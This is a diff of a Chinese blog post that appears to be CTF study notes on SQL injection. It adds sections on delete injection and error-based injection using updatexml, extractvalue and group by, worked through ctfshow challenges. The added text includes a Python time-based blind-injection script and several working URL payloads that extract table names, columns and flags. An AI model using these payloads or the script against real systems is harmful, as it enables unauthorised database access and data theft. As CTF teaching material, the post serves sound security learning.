@@ -69,7 +69,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E8%AF%AD%E6%B3%95"><span class="toc-text">SQL语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">万能密码绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">注入手法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9"><span class="toc-text">修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">预处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-text">Sqlmap一把梭</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="toc-text">insert注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#update%E6%B3%A8%E5%85%A5"><span class="toc-text">update注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-text">limit注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="toc-text">联合查询法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#procedure-analyse-%E5%87%BD%E6%95%B0"><span class="toc-text">procedure analyse()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">报错注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">时间注入法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#group-by%E6%B3%A8%E5%85%A5"><span class="toc-text">group by注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E6%B3%95-1"><span class="toc-text">时间注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">布尔注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%B3%95-1"><span class="toc-text">报错注入法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#finfo%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">finfo文件注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#finfo%E7%B1%BB"><span class="toc-text">finfo类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="toc-text">quine注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8D%E6%95%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3"><span class="toc-text">位数长度不足</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-text">输入过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E8%AF%AD%E6%B3%95"><span class="toc-text">SQL语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">万能密码绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">注入手法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9"><span class="toc-text">修改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">预处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-text">Sqlmap一把梭</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="toc-text">insert注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#update%E6%B3%A8%E5%85%A5"><span class="toc-text">update注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="toc-text">delete注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#group-by"><span class="toc-text">group by</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-text">limit注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="toc-text">联合查询法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#procedure-analyse-%E5%87%BD%E6%95%B0"><span class="toc-text">procedure analyse()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">报错注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">时间注入法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#group-by%E6%B3%A8%E5%85%A5"><span class="toc-text">group by注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5%E6%B3%95-1"><span class="toc-text">时间注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%B3%95"><span class="toc-text">布尔注入法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%B3%95-1"><span class="toc-text">报错注入法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#finfo%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">finfo文件注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#finfo%E7%B1%BB"><span class="toc-text">finfo类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file%E6%B3%A8%E5%85%A5"><span class="toc-text">file注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E5%92%8C%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87"><span class="toc-text">.user.ini和短标签绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="toc-text">quine注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8D%E6%95%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3"><span class="toc-text">位数长度不足</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-text">输入过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -226,7 +226,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Sql/" style="color: #ffa2c4">Sql</a>
+                <a href="/blog/tags/Sql/" style="color: #00bcd4">Sql</a>
             </span>
             
         </span>
@@ -240,7 +240,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">3.9k字</span>
+        <span class="post-count">4.8k字</span>
       </span>
     </span>
 
@@ -249,7 +249,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">16分</span>
+        <span class="post-count">20分</span>
       </span>
     </span>
     
@@ -414,7 +414,8 @@ F <span class="token operator">or</span> T <span class="token operator">=</span>
 </ol>
 <p>注意：python3.9以上需要自行搜索更改几个模块的名称才能使用sqlmap（对着报错文件全局找模块，请）</p>
 <hr>
-<h1 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h1><p>查询语句原型：</p>
+<h1 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h1><p>插入从数据库中获取的信息</p>
+<p>查询语句原型：</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"insert into table_name(column_name1,column_name2) value('&#123;$username&#125;','&#123;$password&#125;');"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>我们的目标是插入信息的同时要能够回显数据库里的内容，为此我们需要用<code>\</code>对<code>&#39;</code>进行转义然后执行其它的语句</p>
@@ -434,27 +435,129 @@ username<span class="token operator">=</span>hello\<span class="token operator">
 <blockquote>
 <p>ctfshow web238</p>
 </blockquote>
-<p>过滤空格，那就用括号闭合来代替（这里仅示例查表名）</p>
+<p>过滤空格包括所有的空格绕过方法，那就用括号闭合来代替（这里仅示例查表名）</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <hr>
 <h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p>利用update修改字段名的功能来注入查询语句，使其字段名能够返回我们需要的信息</p>
-<p><a href="">题目实战</a></p>
+<p><a href="https://c1oudfl0w0.github.io/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/">题目实战</a></p>
 <hr>
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><ul>
-<li><p><strong>group by 重复键冲</strong></p>
-<p><code>?id=-1&#39; and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+ </code></p>
-</li>
-<li><p><strong>extractvalue(目标xml文档，xml路径)函数</strong></p>
+<h1 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h1><p>删除语句</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"delete from  ctfshow_user where id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们虽然不能直接通过这个语句来获取数据库的信息</p>
+<p>但是在这个语句中我们可以输入<code>if(2&gt;1,sleep(0.2),1)</code>进行时间盲注</p>
+<blockquote>
+<p>ctfshow web241</p>
+</blockquote>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
+<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://1a2a5437-423f-4c06-9d47-5ac94a1871f2.challenge.ctf.show/api/delete.php"</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+
+<span class="token comment"># 爆表名</span>
+<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
+<span class="token comment"># 爆列名</span>
+<span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'"</span>
+<span class="token comment"># 爆字段值</span>
+payload <span class="token operator">=</span> <span class="token string">"select flag from `flag`"</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    head <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+
+    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        <span class="token comment"># sleep(0.8)</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>  <span class="token comment"># 中间指针等于头尾指针相加的一半</span>
+        <span class="token comment"># print(mid)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'id'</span><span class="token punctuation">:</span>
+            <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.01),-1)#"</span></span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">)</span>
+            tail <span class="token operator">=</span> mid
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment">#sleep导致超时</span>
+
+    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>通过可以让sql出现报错的语句额外执行查询来实现获取信息</p>
+<p>注：报错长度最长是32，所以要用<code>substr</code>或者<code>substring</code>或者<code>not in</code>等函数去截取</p>
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><p>原理：<code>updatexml()</code>函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就			因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码</p>
+<p>作用： 改变文档中符合条件的节点的值</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>需要查询的内容<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>ctfshow web244</p>
+</blockquote>
+<p>查数据库名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/03/16/sql%E6%B3%A8%E5%85%A5/image-20230819174515576.png" alt="image-20230819174515576"></p>
+<p>查表名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查列名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>ctfshow_flag'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查字段</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>截取</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">extractvalue <span class="token punctuation">(</span>目标xml文档，xml路径<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>对XML文档进行查询的函数，从目标XML中返回包含所查询值的字符串</p>
-<p><code>?id=-1&#39; and extractvalue(1,concat(&#39;^&#39;,(select (不要加列数) database()),&#39;^&#39;)) --+</code></p>
-</li>
-<li><p><strong>updatexml() 函数</strong></p>
-<p>原理：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就			因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码</p>
-<p>作用: 改变文档中符合条件的节点的值</p>
-<p><code>?id=-1&#39; and updatexml(1,concat(&#39;^&#39;,(需要查询的内容),&#39;^&#39;),1) --+</code></p>
-</li>
-</ul>
+<p>利用方法和updatexml类似</p>
+<blockquote>
+<p>ctfshow web245</p>
+</blockquote>
+<p>表名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>列名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>ctfshow_flagsa'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>字段</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag1 <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>截取</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag1 <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h2><p>原理参考这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27130557/article/details/120902212">csdn的文章</a></p>
+<p>原因是<code>group by</code>在向临时表插入数据时，由于<code>rand()</code>多次计算导致<strong>插入临时表时主键重复</strong>，从而报错，</p>
+<p>又因为报错前<code>concat()</code>中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这种报错方法好像没限制长度（？</p>
+<p>注：<code>floor</code>（向下取整）可以也替换成<code>ceil</code>（向上取整）</p>
+<blockquote>
+<p>ctfshow web246</p>
+</blockquote>
+<p>表名</p>
+<p>注：这里不能用<code>group_concat</code>来合并查询结果而只能用<code>limit</code>，因为查询出来的内容不止一行</p>
